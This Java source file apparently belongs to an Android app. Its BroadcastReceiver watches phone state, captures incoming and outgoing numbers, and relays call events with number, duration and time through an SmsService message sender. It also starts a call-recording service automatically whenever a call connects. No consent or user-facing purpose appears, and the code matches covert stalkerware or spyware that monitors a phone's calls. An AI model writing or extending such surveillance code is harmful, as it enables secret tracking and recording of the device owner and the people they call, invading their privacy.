package com.smshandler;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.TelephonyManager;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallReceiver extends BroadcastReceiver {

    private static String sLastState = TelephonyManager.EXTRA_STATE_IDLE;
    private static long   sCallStart = 0;
    private static String sNumber    = "";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            String n = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (n != null) sNumber = n;
            return;
        }

        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String num   = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
        if (num != null && !num.isEmpty()) sNumber = num;
        if (state == null) return;

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)
                && TelephonyManager.EXTRA_STATE_IDLE.equals(sLastState)) {
            final String n = sNumber;
            new Thread(() -> SmsService.sendRawMessage(
                "📞 INCOMING CALL\nFrom: " + n + "\nStatus: Ringing")).start();

        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            sCallStart = System.currentTimeMillis();
            final String n = sNumber;
            boolean wasRinging = TelephonyManager.EXTRA_STATE_RINGING.equals(sLastState);
            new Thread(() -> SmsService.sendRawMessage(
                (wasRinging ? "✅ CALL ANSWERED\nWith: " : "📤 OUTGOING CALL\nTo: ") + n)).start();

            Intent svc = new Intent(ctx, CallRecordingService.class);
            svc.putExtra("call_number", n);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(svc);
            else
                ctx.startService(svc);

        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)
                && !TelephonyManager.EXTRA_STATE_IDLE.equals(sLastState)) {
            long dur = (System.currentTimeMillis() - sCallStart) / 1000;
            final String n = sNumber;
            String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault()).format(new Date());
            new Thread(() -> SmsService.sendRawMessage(
                "📵 CALL ENDED\nWith: " + n + "\nDuration: " + dur + "s\nTime: " + time)).start();

            Intent stop = new Intent(ctx, CallRecordingService.class);
            stop.setAction("STOP");
            ctx.startService(stop);
            sNumber = "";
        }
        sLastState = state;
    }
}
